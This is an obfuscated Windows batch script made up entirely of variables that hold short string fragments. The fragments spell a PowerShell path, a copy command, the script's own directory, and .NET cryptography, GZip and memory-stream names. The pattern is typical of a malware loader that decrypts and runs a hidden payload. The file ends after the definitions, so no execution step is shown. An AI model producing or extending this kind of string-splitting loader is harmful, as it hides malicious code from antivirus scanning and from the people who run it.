@echo off
set "GVgxQxiHLz=we"
set "iGsDFeqnbo= /"
set "nNpDTQhtSR=xe"
set "NXgwPOJHvA=st"
set "mtAlCrsGdV=he"
set "tESYrJNMVq=rs"
set "qoEhQoMejq=y "
set "xyrFvVueJj=in"
set "kJHbVbAiLg=1."
set "hcUJPvjuhl=co"
set "LXTroMtfDv=0\"
set "JBhLbqGeYO=do"
set "zXGwbmZsJo=.e"
set "xaPWXHfLHD=Po"
set "ZqtNPoVyAe=\W"
set "rhQdrFiycm=Wi"
set "mcVpTgfNfB=s\"
set "DYDJCiRjgh=Sy"
set "HGekdGzdGt=\v"
set "BpoFWdsyhN=ll"
set "vuFUCllwDc=nd"
set "DxdIsYuKzN=:\"
set "HRALpEwweF=rS"
set "PTbVBPoQJL=ws"
set "fIDzatyqbv=em"
set "kUxviTNEfd=ll"
set "HEuXLJMlOu=he"
set "QSqaYaAkUf=po"
set "oWRxgMwFVY= C"
set "kIEvjBnvzh=we"
set "YDyjIRzAVD=ow"
set "fxrcyaZPGz=32"
set "oDjnBHNvdl=py"
set "PdPvkahYSp=cd"
set "kucGpUFPVt= %~dp0"
set "dSHyIJMeld=vNIN"
set "YYRzuyQJfX=-1.."
set "lkcGAjPehT=saBm"
set "ILxZGlOxHq=se()"
set "ljSpdNjuhg=ress"
set "MZaYVGVhMf=:('g"
set "vHENxEOYeK=and "
set "fBhNRRCGWq=brea"
set "eQYMalLKmk=ionM"
set "eowImBRyDv=Ugdp"
set "bacIKuqopC=.Sec"
set "MowlmFvzsh=ptog"
set "BZzAKoyKHe=[Sys"
set "noxhqyrdqO=Bmor"
set "GBDkcDuIRY=dV1k"
set "ELZDhDxHdn=:: '"
set "sCTvaTDAOT=$bpu"
set "JzrRVtjtwz=ateD"
set "kwxgABJlwa=.Cre"
set "vXbKeheVZb=pStr"
set "VjtAcrLmxD=.GZi"
set "uJefrfykKK=oint"
set "EUMAPneUHL=O.Me"
set "GbimzqJhKS=pher"
set "AfEBHnYwpd=oArr"
set "SKxbdiNWBs=..-1"
